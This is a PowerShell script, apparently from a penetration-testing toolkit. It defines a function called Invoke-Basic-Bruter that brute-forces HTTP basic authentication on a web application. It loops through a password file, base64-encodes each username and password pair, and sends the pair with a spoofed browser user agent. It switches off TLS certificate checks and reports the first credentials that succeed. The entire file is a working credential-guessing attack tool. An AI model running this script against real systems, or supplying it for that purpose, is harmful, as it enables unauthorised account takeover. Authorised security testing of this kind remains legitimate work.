function Invoke-Basic-Bruter
{
<#
.SYNOPSIS
Script that performs a simple brute force of a web application that implements basic authentication.

.DESCRIPTION
This script takes a username, password file, target, and sleep interval and then performs brute force login attempts.

.PARAMETER UserName
Specify a username to use in the brute force attempt.

.PARAMETER PasswordList
Specify a filename with passwords to use in the brute force attempt.

.PARAMETER Target
Specify a target web application that implements basic authentication.

.PARAMETER Sleep
Specify a sleep time between requests in seconds

.EXAMPLE
PS > Invoke-Basic-Bruter -UserName admin -PasswordList C:\passwords.txt -Target http://127.0.0.1/login -Sleep 10
#>
    [CmdletBinding()] Param(
    [Parameter(Mandatory = $true, Position = 0)]
    [String]
    $UserName,
    
    [Parameter(Mandatory = $true, Position = 1)]
    [String]
    $PasswordList,
    
    [Parameter(Mandatory = $true, Position = 3)]
    [String]
    $Target,
    
    [Parameter(Mandatory = $true, Position = 4)]
    [int]
    $Sleep
    
    )
    Write-Output "Brute forcing basic authentication on $Target using $UserName account..."
    $passwords = Get-Content $PasswordList
    foreach ($password in $passwords) {
        Write-Output "Checking $UserName : $password"
        $cleartext = [System.Text.Encoding]::ASCII.GetBytes($UserName + ":" + $password)
        $encodedtext = [Convert]::ToBase64String($cleartext)
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
        $webRequest = [System.Net.WebRequest]::Create($Target)
        $webRequest.Accept = "text/html, application/xhtml+xml, */*"
        $webRequest.UserAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
        $webRequest.Headers.Add("Authorization: Basic " + $encodedtext)
        Try 
        {
            $Response = $webRequest.GetResponse()
            Write-Host $Response.StatusCode
            if ($Response.StatusCode -eq "OK")
            {
                Write-Host "+++ SUCCESSFUL AUTHENTICATION WITH USERNAME:$UserName PASSWORD:$password +++" -foreground green
                break
            }
        }
        Catch
        {
            Write-Host "UNSUCCESSFUL!" -foreground red
        }
        Start-Sleep -s $Sleep
    }
}